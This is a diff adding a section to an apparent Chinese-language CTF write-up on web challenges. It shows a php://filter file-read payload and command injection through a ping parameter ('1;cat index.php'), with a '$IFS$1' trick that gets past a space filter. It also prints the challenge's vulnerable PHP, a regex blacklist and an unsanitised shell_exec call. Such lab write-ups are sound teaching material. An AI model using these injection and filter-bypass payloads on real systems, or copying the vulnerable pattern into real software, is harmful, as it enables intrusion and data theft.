@@ -145,3 +145,46 @@ php://filter/resource=index.php
 ```
  ?file=php://filter/read=convert.base64-encode/resource=flag.php
 ```
+
+4.过滤
+-
+
+已经通过127.0.0.1;ls 发现了两个文件<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/d621b093-2036-4318-9900-413f12d0d23b)
+
+<br>
+
+```
+/?ip=1;cat index.php
+```
+
+发现过滤了空格。
+
+```
+/?ip=1;cat$IFS$1index.php
+```
+**知识点**：IFS在系统命令里是空格的意思，它的前后面加$是为了固定这个语句，不然和其他字符串行会出错，后面的$1是空字符，也可以写成${IFS}或${IFS}$9之类的，但{IFS}这个不行，因为{}被过滤了。
+输入后获得index.php内容：
+
+```
+/?ip=
+PING 1 (0.0.0.1): 56 data bytes
+/?ip=
+|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
+    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
+    die("fxck your symbol!");
+  } else if(preg_match("/ /", $ip)){
+    die("fxck your space!");
+  } else if(preg_match("/bash/", $ip)){
+    die("fxck your bash!");
+  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
+    die("fxck your flag!");
+  }
+  $a = shell_exec("ping -c 4 ".$ip);
+  echo "
+";
+  print_r($a);
+}
+?>
+```
+
